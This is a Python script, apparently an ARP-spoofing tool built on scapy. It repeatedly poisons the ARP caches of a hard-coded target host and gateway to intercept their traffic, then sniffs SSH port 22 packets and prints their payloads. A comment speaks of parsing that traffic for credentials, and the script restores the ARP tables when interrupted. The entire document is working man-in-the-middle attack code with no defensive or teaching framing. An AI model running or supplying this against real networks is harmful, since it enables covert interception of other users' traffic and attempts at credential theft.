import scapy.all as scapy
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sniff, send
import time

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, verbose=False)

def packet_callback(packet):
    if packet.haslayer(TCP) and packet[TCP].dport == 22:
        if packet.haslayer(IP):
            ip_src = packet[IP].src
            ip_dst = packet[IP].dst
            tcp_payload = packet[TCP].payload
            print(f"[*] Intercepted Packet from {ip_src} to {ip_dst}: {tcp_payload}")
            # Attempt to parse SSH traffic for credentials

target_ip = "10.0.0.11"  
gateway_ip = "10.0.0.1"  

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print(f"\r[*] Packets Sent: {sent_packets_count}", end="")
        time.sleep(2)  # Waits for two seconds

        # Start sniffing for SSH packets
        sniff(filter="tcp port 22", prn=packet_callback, store=False, timeout=2)

except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[+] ARP Spoof Stopped")
